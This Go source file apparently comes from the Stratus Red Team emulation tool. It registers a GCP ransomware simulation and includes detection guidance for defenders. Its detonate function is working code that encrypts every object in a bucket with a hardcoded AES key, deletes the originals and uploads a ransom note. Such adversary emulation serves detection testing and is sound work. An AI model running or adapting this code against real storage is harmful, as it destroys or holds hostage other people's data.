package gcp

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"fmt"
	"io"
	"log"

	"cloud.google.com/go/storage"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"google.golang.org/api/iterator"
)

//go:embed main.tf
var tf []byte

// encryptionKey is a fixed 32-byte AES-256 key embedded in the "malware". In a
// real ransomware scenario this key would be generated per victim and transmitted
// to the attacker's infrastructure, making decryption impossible without paying.
const encryptionKey = "s0m3s3cr3tk3y!stratus-red-team!!"

const ransomNote = `YOUR FILES HAVE BEEN ENCRYPTED

All data in this storage bucket has been encrypted with AES-256-GCM.
To recover your files, contact: attacker@stratus-red-team.cloud
Your unique victim ID: STRATUS-RED-TEAM-SIMULATION

This is a security simulation by Stratus Red Team. No actual ransom is requested.`

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.impact.ransomware-gcs-client-side-encryption",
		FriendlyName: "Ransomware Simulation — Encrypt GCS Objects Client-Side",
		Description: `
Simulates a GCS ransomware attack that encrypts objects in place using AES-256-GCM
client-side encryption rather than simply deleting them. For each object the attack
downloads the content into memory, encrypts it with a hardcoded key, uploads the
ciphertext under the original name with an <code>.enc</code> suffix, and deletes the
plaintext original. Finally a ransom note is uploaded.

This pattern is used by sophisticated ransomware operators who want to hold data
hostage rather than destroy it — the victim retains storage costs and sees encrypted
objects, but cannot access plaintext without the attacker's key.

Warm-up:

- Create a GCS bucket with 10 test objects containing simulated sensitive data

Detonation:

- List all objects in the bucket
- For each object: download, encrypt with AES-256-GCM, re-upload as
  <code>&lt;name&gt;.enc</code>, delete original
- Upload <code>RANSOM_NOTE.txt</code>

References:

- https://cloud.google.com/storage/docs/encryption
- https://cloud.google.com/storage/docs/json_api/v1/objects
- https://panther.com/blog/detecting-and-hunting-for-cloud-ransomware-part-2-gcp-gcs
- https://www.paloaltonetworks.com/blog/prisma-cloud/ransomware-data-protection-cloud/
`,
		Detection: `
Identify a pattern of paired GCS object writes and deletes on the same bucket in a
short time window by monitoring for <code>storage.objects.create</code> and
<code>storage.objects.delete</code> events in GCP Data Access audit logs where the
new object names carry an <code>.enc</code> suffix and are followed by deletion of
the corresponding plaintext objects.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

// encryptAESGCM encrypts plaintext using AES-256-GCM with a random nonce.
// The output format is: nonce (12 bytes) || ciphertext.
func encryptAESGCM(key []byte, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("failed to generate nonce: %w", err)
	}

	// Seal appends the ciphertext and authentication tag to nonce.
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	ctx := context.Background()

	storageClient, err := storage.NewClient(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Storage client: %w", err)
	}
	defer storageClient.Close()

	bucket := storageClient.Bucket(bucketName)

	var objectNames []string
	it := bucket.Objects(ctx, nil)
	for {
		attrs, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			return fmt.Errorf("failed to list objects in bucket %s: %w", bucketName, err)
		}
		objectNames = append(objectNames, attrs.Name)
	}

	log.Printf("Encrypting %d objects in bucket %s\n", len(objectNames), bucketName)

	key := []byte(encryptionKey)
	for i, name := range objectNames {
		log.Printf("Encrypting object %d/%d: %s\n", i+1, len(objectNames), name)

		reader, err := bucket.Object(name).NewReader(ctx)
		if err != nil {
			return fmt.Errorf("failed to open object %s for reading: %w", name, err)
		}
		plaintext, err := io.ReadAll(reader)
		reader.Close()
		if err != nil {
			return fmt.Errorf("failed to read object %s: %w", name, err)
		}

		ciphertext, err := encryptAESGCM(key, plaintext)
		if err != nil {
			return fmt.Errorf("failed to encrypt object %s: %w", name, err)
		}

		encName := name + ".enc"
		writer := bucket.Object(encName).NewWriter(ctx)
		if _, err = writer.Write(ciphertext); err != nil {
			writer.Close()
			return fmt.Errorf("failed to write encrypted object %s: %w", encName, err)
		}
		if err = writer.Close(); err != nil {
			return fmt.Errorf("failed to finalize encrypted object %s: %w", encName, err)
		}

		if err = bucket.Object(name).Delete(ctx); err != nil {
			return fmt.Errorf("failed to delete original object %s: %w", name, err)
		}
	}

	log.Printf("All %d objects encrypted. Uploading ransom note.\n", len(objectNames))
	writer := bucket.Object("RANSOM_NOTE.txt").NewWriter(ctx)
	if _, err := fmt.Fprint(writer, ransomNote); err != nil {
		writer.Close()
		return fmt.Errorf("failed to write ransom note: %w", err)
	}
	if err := writer.Close(); err != nil {
		return fmt.Errorf("failed to finalize ransom note upload: %w", err)
	}

	log.Printf("Ransomware simulation complete. Ransom note uploaded to gs://%s/RANSOM_NOTE.txt\n", bucketName)
	return nil
}
